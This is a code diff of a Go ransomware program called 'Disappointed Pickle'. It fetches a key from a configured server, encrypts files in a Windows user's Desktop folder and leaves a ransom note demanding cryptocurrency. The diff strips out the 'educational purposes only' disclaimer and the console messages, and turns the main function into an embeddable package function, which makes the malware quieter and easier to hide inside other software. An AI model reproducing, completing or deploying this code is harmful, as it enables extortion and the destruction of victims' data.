@@ -5,7 +5,7 @@
 	A simple ransomware for windows that encrypts the files on the home folder of the user.
 */
 
-package main
+package disappointedPickle
 
 import (
 	"fmt"
@@ -16,26 +16,17 @@ import (
 	"path/filepath"
 	"runtime"
 
-	"github.com/common-nighthawk/go-figure"
 	"github.com/joho/godotenv"
-	"ransomware.com/main/internal/colors"
 	"ransomware.com/main/internal/ransomware"
 )
 
 const Version = "1.0"
-const Disclaimer = colors.ColorRed + "Disclaimer: " + colors.ColorBlue + "\nThis code is ransomware and is for educational purposes only. " +
-	"Do not use it for malicious purposes. the creator not responsible for any damage caused by this code." + colors.ColorReset
-
 const Statement = "Your files have been encrypted. To decrypt them, send $1000 worth in XMR to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"
 
-func titleScreen() {
-	title := figure.NewFigure("Disappointed  Pickle  "+Version, "puffy", true)
-	title.Print()
-	fmt.Println(Disclaimer)
-}
+var outputFilename string
 
-func main() {
-	titleScreen()
+func disappointedPickle() {
+
 	if runtime.GOOS != "windows" {
 		fmt.Println("Windows is required to run this ransomware. Exiting...")
 		return
@@ -44,8 +35,7 @@ func main() {
 	// check if ransomware was already executed
 	_, err := os.Stat(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"))
 	if err == nil {
-		fmt.Println("Ransomware has already been executed. Exiting...")
-		return
+		os.Exit(0)
 	}
 
 	err = godotenv.Load()
@@ -56,8 +46,6 @@ func main() {
 	ipaddr := os.Getenv("IP_ADDRESS")
 	port := os.Getenv("PORT")
 
-	fmt.Println("Connecting to server...")
-
 	resp, err := http.Get("http://" + ipaddr + ":" + port + "/createkey")
 	if err != nil {
 		fmt.Println("Error getting key:", err)
@@ -65,18 +53,20 @@ func main() {
 	}
 	defer resp.Body.Close()
 
-	fmt.Println("Getting key from server...")
-
 	key, err := io.ReadAll(resp.Body)
 	if err != nil {
 		fmt.Println("Error reading key:", err)
 		return
 	}
 
-	fmt.Println("Key:", string(key))
-
 	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
-	key = nil
+
+	// overwrite key
+	key = make([]byte, 64)
+
+	if key == nil {
+		os.Exit(1)
+	}
 
 	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"), []byte(Statement), 0644)
 }
